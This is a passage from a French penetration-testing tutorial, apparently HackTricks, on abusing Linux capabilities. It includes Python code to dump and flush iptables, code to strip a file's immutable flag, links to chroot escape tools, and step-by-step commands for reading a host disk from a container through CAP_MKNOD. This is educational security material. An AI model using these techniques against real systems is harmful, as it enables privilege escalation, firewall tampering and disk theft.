tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet au détenteur de la capacité de **modifier les pare-feu des espaces de noms réseau exposés, les tables de routage, les permissions des sockets**, la configuration de l'interface réseau et d'autres paramètres liés sur les interfaces réseau exposées. Cela permet également d'**activer le mode promiscuous** pour les interfaces réseau attachées et potentiellement d'espionner à travers les espaces de noms.

**Exemple avec un binaire**

Supposons que le **binaire python** possède ces capacités.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Cela signifie qu'il est possible de modifier les attributs d'inode.** Vous ne pouvez pas élever les privilèges directement avec cette capacité.

**Exemple avec un binaire**

Si vous découvrez qu'un fichier est immuable et que python possède cette capacité, vous pouvez **retirer l'attribut immuable et rendre le fichier modifiable :**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Notez que généralement cet attribut immuable est défini et supprimé en utilisant :
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet l'utilisation de l'appel système `chroot(2)`. Cela peut permettre de s'échapper de tout environnement `chroot(2)`, en utilisant des faiblesses et des évasions connues :

* [Comment s'échapper de différentes solutions chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t : outil d'évasion chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet d'utiliser l'appel système `reboot(2)`. Il permet également d'exécuter une **commande de redémarrage** arbitraire via `LINUX_REBOOT_CMD_RESTART2`, implémentée pour certaines plateformes matérielles spécifiques.

Cette capacité permet également l'utilisation de l'appel système `kexec_load(2)`, qui charge un nouveau noyau d'urgence et, à partir de Linux 3.17, de `kexec_file_load(2)` qui charge également des noyaux signés.

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) a finalement été séparé de `CAP_SYS_ADMIN` dans Linux 2.6.37, cette capacité permet au processus d'utiliser l'appel système `syslog(2)`. Cela permet également au processus de voir les adresses du noyau exposées via `/proc` et d'autres interfaces lorsque `/proc/sys/kernel/kptr_restrict` est réglé sur 1.

Le réglage sysctl `kptr_restrict` a été introduit dans 2.6.38, et détermine si les adresses du noyau sont exposées. Par défaut, il est à zéro (exposition des adresses du noyau) depuis 2.6.39 dans le noyau vanille, bien que de nombreuses distributions règlent correctement la valeur sur 1 (cacher à tout le monde sauf uid 0) ou 2 (toujours cacher).

De plus, cette capacité permet également au processus de voir la sortie de `dmesg`, si le réglage `dmesg_restrict` est à 1. Enfin, la capacité `CAP_SYS_ADMIN` est toujours autorisée à effectuer des opérations `syslog` elle-même pour des raisons historiques.

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet une utilisation étendue de [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) en autorisant la création de quelque chose d'autre qu'un fichier ordinaire (`S_IFREG`), FIFO (tube nommé)(`S_IFIFO`), ou socket de domaine UNIX (`S_IFSOCK`). Les fichiers spéciaux sont :

* `S_IFCHR` (Fichier spécial caractère (un périphérique comme un terminal))
* `S_IFBLK` (Fichier spécial bloc (un périphérique comme un disque)).

C'est une capacité par défaut ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Cette capacité permet de réaliser des escalades de privilèges (à travers la lecture complète du disque) sur l'hôte, sous ces conditions :

1. Avoir un accès initial à l'hôte (Non privilégié).
2. Avoir un accès initial au conteneur (Privilégié (EUID 0), et `CAP_MKNOD` effectif).
3. L'hôte et le conteneur doivent partager le même espace de noms utilisateur.

**Étapes :**

1. Sur l'hôte, en tant qu'utilisateur standard :
   1. Obtenir l'UID actuel (`id`). Par exemple : `uid=1000(non privilégié)`.
   2. Obtenir le périphérique que vous souhaitez lire. Par exemple : `/dev/sda`
2. Dans le conteneur, en tant que `root` :
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. Retour sur l'hôte :
```bash
# Find the PID linked to the container owns by the user "unprivileged"
# Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
L'attaquant peut maintenant lire, dumper, copier le périphérique /dev/sda depuis un utilisateur non privilégié.

### CAP\_SETPCAP

**`CAP_SETPCAP`** est une capacité Linux qui permet à un processus de **modifier les ensembles de capacités d'un autre processus**. Elle confère la capacité d'ajouter ou de retirer des capacités des ensembles de capacités effectives, héritables et autorisées d'autres processus. Cependant, il existe certaines restrictions sur la manière dont cette capacité peut être utilisée.

Un processus avec `CAP_SETPCAP` **ne peut accorder ou retirer que des capacités qui sont dans son propre ensemble de capacités autorisées**. En d'autres termes, un processus ne peut pas accorder une capacité à un autre processus s'il ne possède pas lui-même cette capacité. Cette restriction empêche un processus d'élever les privilèges d'un autre processus au-delà de son propre niveau de privilège.

De plus, dans les versions récentes du noyau, la capacité `CAP_SETPCAP` a été **davantage restreinte**. Elle ne permet plus à un processus de modifier arbitrairement les ensembles de capacités d'autres processus. Au lieu de cela, elle **permet uniquement à un processus de réduire les capacités dans son propre ensemble de capacités autorisées ou l'ensemble de capacités autorisées de ses descendants**. Ce changement a été introduit pour réduire les risques de sécurité potentiels associés à la capacité.

Pour utiliser `CAP_SETPCAP` efficacement, vous devez avoir la capacité dans votre ensemble de capacités effectives et les capacités cibles dans votre ensemble de capacités autorisées. Vous pouvez ensuite utiliser l'appel système `capset()` pour modifier les ensembles de capacités d'autres processus.

En résumé, `CAP_SETPCAP` permet à un processus de modifier les ensembles de capacités d'autres processus, mais il ne peut pas accorder des capacités qu'il ne possède pas lui-même. De plus, en raison de préoccupations de sécurité, sa fonctionnalité a été limitée dans les versions récentes du noyau pour permettre uniquement de réduire les capacités dans son propre ensemble de capacités autorisées ou les ensembles de capacités autorisées de ses descendants.

## Références

**La plupart de ces exemples proviennent de certains laboratoires de** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), donc si vous souhaitez pratiquer ces techniques de privesc, je recommande ces laboratoires.

**Autres références** :

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) est l'événement de cybersécurité le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir la connaissance technique**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
